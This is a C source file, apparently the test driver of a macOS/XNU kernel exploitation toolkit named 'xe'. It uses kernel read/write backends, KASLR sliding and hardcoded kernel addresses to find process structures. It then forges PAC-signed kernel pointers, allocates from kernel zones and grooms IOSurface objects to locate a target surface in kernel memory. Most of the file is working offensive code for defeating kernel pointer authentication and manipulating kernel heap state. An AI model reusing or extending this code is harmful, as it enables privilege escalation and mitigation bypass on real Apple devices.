//
//  main.c
//  xe
//
//  Created by admin on 11/20/21.
//

#include <assert.h>
#include <string.h>
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <limits.h>

#include "kmem.h"
#include "kmem_gym.h"
#include "kmem_remote.h"
#include "slider.h"
#include "platform_variables.h"
#include "platform_types.h"
#include "allocator_iosurface.h"
#include "xnu_proc.h"
#include "util_pacda.h"
#include "util_zone.h"
#include "io_dictionary.h"
#include "io_array.h"
#include "io_registry_entry.h"
#include "io_surface.h"


void test_run_pacda(int argc, const char* argv[]) {
    struct xe_kmem_backend* backend = xe_kmem_remote_client_create(argv[1]);
    xe_kmem_use_backend(backend);
    xe_slider_init();
    
    uintptr_t kernproc = xe_kmem_read_uint64(xe_slider_slide(VAR_KERNPROC_ADDR));

    uintptr_t proc;
    int error = xe_xnu_proc_find(kernproc, getpid(), &proc);
    if (error) {
        printf("[ERROR] cannot find current proc, err: %d\n", error);
        return;
    }
    
    printf("[INFO] pid: %d\n", getpid());
    printf("[INFO] proc: %p\n", (void*)proc);
    
    for (int i=0; i<10; i++) {
        uintptr_t ptr = kernproc;
        uintptr_t ctx = 0xabcdef;
        uintptr_t signed_ptr;
        
        error = xe_util_pacda_sign(proc, ptr, ctx, &signed_ptr);
        if (error) {
            printf("[ERROR] ptr sign failed, err: %d\n", error);
            return;
        }
        
        printf("[INFO] signed ptr: %p\n", (void*)signed_ptr);
    }
}


void test_run_zalloc(void) {
    xe_kmem_use_backend(xe_kmem_gym_create());
    xe_slider_init();
    
    uintptr_t zone = xe_kmem_read_uint64(xe_slider_slide(0xfffffe000723fe40));
    uintptr_t out;
    int error = xe_util_zone_allocate(zone, &out);
    if (error) {
        printf("[ERROR] zone alloc failed, err: \"%s\"\n", strerror(error));
    }
    printf("%p\n", (void*)out);
}


int main(int argc, const char * argv[]) {
    assert(argc == 2);
    
//    test_run_pacda()
//    for (int i=0; i<10; i++) {
//        test_run_zalloc();
//    }
    
    xe_kmem_use_backend(xe_kmem_gym_create());
    xe_slider_init();
    
//    uintptr_t g_io_registry_planes = xe_kmem_read_uint64(xe_slider_slide(VAR_G_IO_REGISTRY_PLANES));
//    xe_io_os_dictionary_print_keys(g_io_registry_planes);
    
    iokit_iosurface_allocator_t allocator;
    int error = iokit_iosurface_allocator_create(&allocator);
    assert(error == 0);
    
    size_t alloc_idx;
    error = iokit_iosurface_allocator_allocate(allocator, 64, 1, &alloc_idx);
    assert(error == 0);
    
    uintptr_t io_registry_root = xe_io_registry_entry_root();
    
    uintptr_t pe_device;
    error = xe_io_registry_entry_find_child_by_name(io_registry_root, "J316sAP", &pe_device);
    assert(error == 0);
    
    uintptr_t io_resources;
    error = xe_io_registry_entry_find_child_by_type(pe_device, xe_slider_slide(0xfffffe000720b438), &io_resources);
    assert(error == 0);
    
    uintptr_t io_surface_root;
    error = xe_io_registry_entry_find_child_by_name(io_resources, "IOSurfaceRoot", &io_surface_root);
    assert(error == 0);
    
    printf("%p\n", (void*)io_surface_root);
    
    uintptr_t registry = xe_io_registry_entry_registry_table(io_surface_root);
    xe_io_os_dictionary_print_keys(registry);
    uintptr_t children;
    error = xe_io_os_dictionary_find_value(registry, "IOServiceChildLinks", &children);
    assert(error == 0);
    
    uintptr_t target_surface = 0;
    for (int i=xe_io_os_array_count(children)-1; i>=0; i--) {
        error = xe_io_surface_find_surface_with_props_key(xe_io_os_array_value_at_index(children, i), "iosurface_alloc_0", &target_surface);
        if (!error) {
            break;
        }
    }
    assert(target_surface != 0);
    
    getpass("press enter to continue\n");
    iokit_iosurface_allocator_destroy(&allocator);
    return 0;
}
